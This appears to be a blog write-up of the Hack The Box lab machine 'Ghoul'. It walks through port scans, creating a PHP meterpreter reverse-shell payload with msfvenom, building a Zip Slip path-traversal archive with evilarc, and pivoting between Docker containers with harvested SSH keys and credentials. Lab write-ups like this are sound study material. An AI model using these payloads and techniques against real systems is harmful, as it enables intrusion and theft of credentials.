<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Ghoul - Hack The Box - hackcommander.io</title>
<meta name="description" content="Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Ghoul - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-ghoul/">


  <meta property="og:description" content="Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-ghoul/ghoul_logo.png">





  <meta property="article:published_time" content="2019-10-05T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-ghoul/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Ghoul - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Ghoul - Hack The Box">
    <meta itemprop="description" content="Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS.">
    <meta itemprop="datePublished" content="October 05, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Ghoul - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-10-05T00:00:00+02:00">October 05, 2019 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-ghoul/ghoul_logo.png" alt=""></p>

<p>Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>Guess the simple HTTP basic auth credentials for the tomcat web application running on port 8080</li>
  <li>Exploit the Zip Slip vulnerability in the upload form to upload a meterpreter shell</li>
  <li>Find SSH keys backups for 3 local users, one of them is encrypted but the password is found in the chat app screenshot</li>
  <li>Find additional container hosts by uploading a statically compiled nmap binary</li>
  <li>Identify cronjob of user logging onto one of the container and using the SSH agent</li>
  <li>Find Gogs application running on another container and pop a shell using CVE-2018-18925 and CVE-2018-20303</li>
  <li>Download 7zip archive containing a git repo and extract credentials from git reflogs</li>
  <li>Log in as root to the container on which we found the SSH agent earlier and hijack the private keys of the connecting user to get root access on the host</li>
</ul>

<h3 id="toolsblogs-used">Tools/Blogs used</h3>

<ul>
  <li><a href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></li>
  <li><a href="https://github.com/TheZ3ro/gogsownz">https://github.com/TheZ3ro/gogsownz</a></li>
</ul>

<h3 id="portscan">Portscan</h3>

<p>A few observations based on the initial scan:</p>
<ul>
  <li>There are two sshd daemons running on this box and they’re both running a different version.</li>
  <li>There are two webservers, one running Apache and the other one Tomcat</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 15:00 EDT
Nmap scan report for ghoul.htb (10.10.10.101)
Host is up (0.011s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h3 id="website-enumeration-on-port-80">Website enumeration on port 80</h3>

<p>The website is some kind of Tokyo Ghoul themed website with a homepage, blog and contact section.</p>

<p><img src="/assets/images/htb-writeup-ghoul/port80.png" alt=""></p>

<p>There’s a contact form so that could be a potential target for command injection or XSS:</p>

<p><img src="/assets/images/htb-writeup-ghoul/contact.png" alt=""></p>

<p>The contact form doesn’t work because it sends a <code class="language-plaintext highlighter-rouge">POST /bat/MailHandler.php</code> and that file doesn’t exist. This is probably safe to ignore for now.</p>

<p>Like every box running a webserver, I’m running gobuster to see if I can find any hidden directories or files.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -x php -u http://10.10.10.101
[...]
/archives (Status: 301)
/css (Status: 301)
/images (Status: 301)
/js (Status: 301)
/secret.php (Status: 200)
/server-status (Status: 403)
/uploads (Status: 301)
/users (Status: 301)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">secret.php</code>, <code class="language-plaintext highlighter-rouge">/users</code> and <code class="language-plaintext highlighter-rouge">/uploads</code> are interesting, but the later gives me a 403 Forbidden message.</p>

<p>The <code class="language-plaintext highlighter-rouge">secret.pnp</code> is just an image of some kind of simulated chat application.</p>

<p><img src="/assets/images/htb-writeup-ghoul/secret.png" alt=""></p>

<p>I’ve highlighted above some possibles clues:</p>

<ul>
  <li>That fake flag/hash is obviously a troll</li>
  <li>There’s a mention of an RCE, file service, and vsftp. I didn’t see FTP open during my portscan however.</li>
  <li>IP logs, maybe useful for something else</li>
  <li>X server, but I didn’t see that port open during the portscan</li>
  <li>ILoveTouka could be a password or part of a password, I’ll keep that in mind for later</li>
</ul>

<p>The <code class="language-plaintext highlighter-rouge">/users</code> page shows a login page:</p>

<p><img src="/assets/images/htb-writeup-ghoul/users.png" alt=""></p>

<p>I tried a couple of default logins and looked for SQL injections, no luck. I will need to find the credentials to get past the login page.</p>

<h3 id="website-enumeration-on-port-8080">Website enumeration on port 8080</h3>

<p>The website is protected with HTTP Basic Auth, but I guessed the <code class="language-plaintext highlighter-rouge">admin/admin</code> login right on the first try.</p>

<p>Once authenticated, I find another website running on port 8080. It’s some generic company website.</p>

<p><img src="/assets/images/htb-writeup-ghoul/port8080.png" alt=""></p>

<p>There’s also a contact form but it doesn’t seem to do anything except return some random message:</p>

<p><img src="/assets/images/htb-writeup-ghoul/contact2.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-ghoul/troll_1.png" alt=""></p>

<p>The most interesting thing on this page are the two upload forms: One for images, and another one for Zip files.</p>

<p><img src="/assets/images/htb-writeup-ghoul/upload_img.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-ghoul/upload_zip.png" alt=""></p>

<p>The image upload form checks that the file signature is a JPEG.</p>

<p><img src="/assets/images/htb-writeup-ghoul/upload_jpg_ok.png" alt=""></p>

<p>If I try to upload any other file type I get the following error message.</p>

<p><img src="/assets/images/htb-writeup-ghoul/upload_jpg_nok.png" alt=""></p>

<p>The same checks are enforced for ZIP files, here’s a successful upload for a ZIP file:</p>

<p><img src="/assets/images/htb-writeup-ghoul/upload_jpg_ok.png" alt=""></p>

<p>And here’s the error when uploading another file type:</p>

<p><img src="/assets/images/htb-writeup-ghoul/upload_jpg_nok.png" alt=""></p>

<p>So it seems I can only upload ZIP and JPG files and I don’t know where they are stored. I ran gobuster to try to find an upload folder or something on port 8080 but I didn’t find anything.</p>

<h3 id="getting-a-shell-with-zip-slip">Getting a shell with Zip Slip</h3>

<p>There’s a well known arbitrary file overwrite vulnerability called Zip Slip that affects multiple projects, including Java. The gist of it is we can craft a malicious zip file  that when extracted will place the content to an arbitrary location of our choosing. Normally, using file traversal characters would be forbidden but the vulnerability here allow such characters to be processed by Java. In this case, we want to place a reverse shell payload somewhere on the webserver where we can access it and trigger it.</p>

<p>Details on the vulnerability can be found here: <a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p>

<p>To generate the zip files, I used the <a href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a> python tool:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1112 bytes
Saved as: met.php
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python evilarc.py -f met.zip -o unix -p "../../../../../../var/www/html" met.php
Creating met.zip containing ../../../../../../../../../../../../../../var/www/html/met.php
</code></pre></div></div>

<p>After creating the archive, I uploaded it then triggered the meterpreter payload by browsing to it <code class="language-plaintext highlighter-rouge">/met.php</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Started reverse TCP handler on 10.10.14.23:4444
msf5 exploit(multi/handler) &gt; [*] Encoded stage with php/base64
[*] Sending encoded stage (51106 bytes) to 10.10.10.101
[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.101:46874) at 2019-05-06 21:41:05 -0400

meterpreter &gt; shell
Process 1180 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Aogiri:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre></div></div>

<p>Cool, I now have a shell but I can’t read any of the home directories:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/backups/backups/keys$ ls -l /home
ls -l /home
total 24
drwx------ 1 Eto    Eto    4096 Dec 13 13:45 Eto
drwx------ 1 kaneki kaneki 4096 Dec 13 13:45 kaneki
drwx------ 1 noro   noro   4096 Dec 13 13:45 noro
</code></pre></div></div>

<p>Next, I checked the <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory for any useful data or credential in the website source files:</p>

<p><code class="language-plaintext highlighter-rouge">login.php</code> has hardcoded credentials:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Submit'</span><span class="p">])){</span>
<span class="cm">/* Define username and associated password array */</span>
<span class="nv">$logins</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'kaneki'</span> <span class="o">=&gt;</span> <span class="s1">'123456'</span><span class="p">,</span><span class="s1">'noro'</span> <span class="o">=&gt;</span> <span class="s1">'password123'</span><span class="p">,</span><span class="s1">'admin'</span> <span class="o">=&gt;</span> <span class="s1">'abcdef'</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">/usr/share/tomcat7/conf/tomcat-users.xml</code> has some more credentials:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--&lt;user username="admin" password="test@aogiri123" roles="admin" /&gt;
  &lt;role rolename="admin" /&gt;--&gt;
</code></pre></div></div>

<h3 id="find-ssh-user-keys">Find SSH user keys</h3>

<p>After some enumeration I found interesting stuff in <code class="language-plaintext highlighter-rouge">/var/backups/backups</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/backups/backups$ ls -la
ls -la
total 3852
drwxr-xr-x 1 root root    4096 Dec 13 13:45 .
drwxr-xr-x 1 root root    4096 Dec 13 13:45 ..
-rw-r--r-- 1 root root 3886432 Dec 13 13:45 Important.pdf
drwxr-xr-x 2 root root    4096 Dec 13 13:45 keys
-rw-r--r-- 1 root root     112 Dec 13 13:45 note.txt
-rw-r--r-- 1 root root   29380 Dec 13 13:45 sales.xlsx
</code></pre></div></div>

<p>The note is pretty useless:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/backups/backups$ cat note.txt
The files from our remote server Ethereal will be saved here. I'll keep updating it overtime, so keep checking.
</code></pre></div></div>

<p>But there are SSH keys backups for all three users:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/backups/backups/keys$ ls -l
total 12
-rwxr--r-- 1 root root 1675 Dec 13 13:45 eto.backup
-rwxr--r-- 1 root root 1766 Dec 13 13:45 kaneki.backup
-rwxr--r-- 1 root root 1675 Dec 13 13:45 noro.backup

www-data@Aogiri:/var/backups/backups/keys$ file *.backup
file *.backup
eto.backup:    PEM RSA private key
kaneki.backup: PEM RSA private key
noro.backup:   PEM RSA private key
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">eto.backup</code> and <code class="language-plaintext highlighter-rouge">noro.backup</code> are unencrypted, but <code class="language-plaintext highlighter-rouge">kaneki.backup</code> is encrypted:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/backups/backups/keys$ cat kaneki.backup
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491F
</code></pre></div></div>

<p>I transfered all the files to my Kali VM, including the <code class="language-plaintext highlighter-rouge">Important.pdf</code> file but I couldn’t open it (corrupted or something).</p>

<h3 id="logging-as-eto">Logging as Eto</h3>

<p>Nothing interesting with Eto:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh -i eto.backup Eto@10.10.10.101
Eto@Aogiri:~$ ls
alert.txt
Eto@Aogiri:~$ cat alert.txt
Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!
</code></pre></div></div>

<h3 id="logging-as-noro">Logging as noro</h3>

<p>Nothing interesting either with noro:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh -i noro.backup noro@10.10.10.101
noro@Aogiri:~$ ls
to-do.txt
noro@Aogiri:~$ cat to-do.txt
Need to update backups.
</code></pre></div></div>

<h3 id="logging-as-kaneki">Logging as kaneki</h3>

<p>I found the password for the kaneki’s SSH private key is <code class="language-plaintext highlighter-rouge">ILoveTouka</code> as per the <code class="language-plaintext highlighter-rouge">secret.php</code> page found earlier:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh -i kaneki.backup kaneki@10.10.10.101
Enter passphrase for key 'kaneki.backup':
Last login: Sun Jan 20 12:33:33 2019 from 172.20.0.1
kaneki@Aogiri:~$ ls
note.txt  notes  secret.jpg  user.txt

kaneki@Aogiri:~$ cat note.txt
Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.

kaneki@Aogiri:~$ cat notes
I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
DM me for the access.

kaneki@Aogiri:~$ cat user.txt
7c0f11...
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">secret.jpg</code> file seems to be just a troll, I tried <code class="language-plaintext highlighter-rouge">steghide</code>, <code class="language-plaintext highlighter-rouge">binwalk</code> and other CTF stego tools and didn’t find any hidden information.</p>

<p>I’m in a docker container, as per the <code class="language-plaintext highlighter-rouge">.dockerenv</code> file and the IP address <code class="language-plaintext highlighter-rouge">172.20.0.10</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki@Aogiri:/$ ls -la
total 116
-rwxr-xr-x   1 root root    0 Dec 13 13:45 .dockerenv

kaneki@Aogiri:/$ ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
        RX packets 54446  bytes 6369464 (6.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 44912  bytes 56773469 (56.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<h3 id="getting-access-to-kaneki-pc">Getting access to kaneki-pc</h3>

<p>Kaneki’s ssh directory contains two entries in the <code class="language-plaintext highlighter-rouge">authorized_keys</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki@Aogiri:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7T[...] kaneki_pub@kaneki-pc
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8f[...] kaneki@Aogiri
</code></pre></div></div>

<p>I noticed that there is a different username: <code class="language-plaintext highlighter-rouge">kaneki_pub</code></p>

<p>There’s most likely another container running, I found it by uploading a statically compiled copy of nmap and scanning 172.20.0.0/16:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki@Aogiri:~$ ./nmap -sP 172.20.0.0/16

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 02:35 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00039s latency).
Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.00027s latency).
Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00029s latency).
</code></pre></div></div>

<p>So the other container is <code class="language-plaintext highlighter-rouge">172.20.0.150</code>. I can log in using the <code class="language-plaintext highlighter-rouge">kaneki_pub</code> username and the same <code class="language-plaintext highlighter-rouge">ILoveTouka</code> password for the private key.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150
Enter passphrase for key '/home/kaneki/.ssh/id_rsa':
Last login: Tue May  7 00:04:35 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$ ls
to-do.txt
kaneki_pub@kaneki-pc:~$ cat to-do.txt
Give AogiriTest user access to Eto for git.
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">AogiriTest</code> could be useful, let’s make note of it.</p>

<h3 id="enumerating-kaneki-pc">Enumerating kaneki-pc</h3>

<p>The kaneki-pc container has a leg on another network segment: <code class="language-plaintext highlighter-rouge">172.18.0.0/16</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255

eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
</code></pre></div></div>

<p>There’s also another user <code class="language-plaintext highlighter-rouge">kaneki_adm</code> on this machine, but I don’t have access to it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_adm:x:1001:1001::/home/kaneki_adm:/bin/bash
kaneki_pub:x:1000:1002::/home/kaneki_pub:/bin/bash
kaneki_pub@kaneki-pc:/home$ ls
kaneki_adm  kaneki_pub
</code></pre></div></div>

<p>I saw that some user connected to the server with ssh-agent enabled:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:/home$ ls -l /tmp
total 16
drwx------ 1 root       root       4096 Dec 16 07:36 ssh-1Oo5P5JuouKm
drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16 07:36 ssh-FWSgs7xBNwzU
drwx------ 1 kaneki_pub kaneki     4096 Dec 16 07:36 ssh-jDhFSu7EeAnz
-rw------- 1 root       root        400 May  7 02:28 sshd-stderr---supervisor-22D6A5.log
-rw------- 1 root       root          0 May  7 02:28 sshd-stdout---supervisor-0BpnC3.log
</code></pre></div></div>

<p>There seems to be a cron job from <code class="language-plaintext highlighter-rouge">172.20.0.1</code> that logs in with user <code class="language-plaintext highlighter-rouge">kaneki_adm</code> every 6 minutes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:/home$ last -10
kaneki_a pts/2        172.20.0.1       Tue May  7 02:42 - 02:42  (00:00)
kaneki_p pts/1        172.20.0.10      Tue May  7 02:38    gone - no logout
kaneki_a pts/1        172.20.0.1       Tue May  7 02:36 - 02:36  (00:00)
kaneki_a pts/1        172.20.0.1       Tue May  7 02:30 - 02:30  (00:00)
kaneki_a pts/1        172.20.0.1       Sun Apr 28 14:12 - 14:12  (00:00)
kaneki_a pts/1        172.20.0.1       Wed Apr 24 12:42 - 12:42  (00:00)
kaneki_a pts/1        172.20.0.1       Sun Mar  3 06:18 - 06:18  (00:00)
kaneki_a pts/1        172.20.0.1       Sun Mar  3 06:12 - 06:15  (00:02)
kaneki_a pts/1        172.20.0.1       Tue Jan 22 17:12 - 17:12  (00:00)
kaneki_a pts/1        172.20.0.1       Tue Jan 22 17:06 - 17:06  (00:00)

wtmp begins Sat Dec 29 05:26:31 2018
kaneki_pub@kaneki-pc:/home$ date
Tue May  7 02:44:01 UTC 2019
</code></pre></div></div>

<p>I uploaded Ippsec’s process monitor to watch for any cronjob or new processes created:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">IFS</span><span class="o">=</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span>

<span class="nv">old_process</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
	</span><span class="nv">new_process</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span>
	diff &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$old_process</span><span class="s2">"</span><span class="o">)</span> &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$new_process</span><span class="s2">"</span><span class="o">)</span>
	<span class="nb">sleep </span>1
	<span class="nv">old_process</span><span class="o">=</span><span class="nv">$new_process</span>
<span class="k">done</span>
</code></pre></div></div>

<p>After a few minutes I caught the <code class="language-plaintext highlighter-rouge">kaneki_adm</code> user connecting to <code class="language-plaintext highlighter-rouge">172.18.0.1</code> as root:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ ./procmon.sh
7,9d6
&lt; sshd: kaneki_adm [priv]
&lt; sshd: kaneki_adm@pts/2
&lt; ssh root@172.18.0.1 -p 2222 -t ./log.sh
</code></pre></div></div>

<p>If I had root access on the container I could get access to the ssh agent socket and hijack the private key but I don’t have root yet.</p>

<p>Next I scanned the subnet on that other network interface to see if I could find any other hosts there:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ ./nmap -sP 172.18.0.0/16

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 03:08 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.18.0.1)
Host is up (0.00082s latency).
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00068s latency).
Nmap scan report for kaneki-pc (172.18.0.200)
Host is up (0.00037s latency).

[...]

kaneki_pub@kaneki-pc:~$ ./nmap -p- 172.18.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 03:09 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown
</code></pre></div></div>

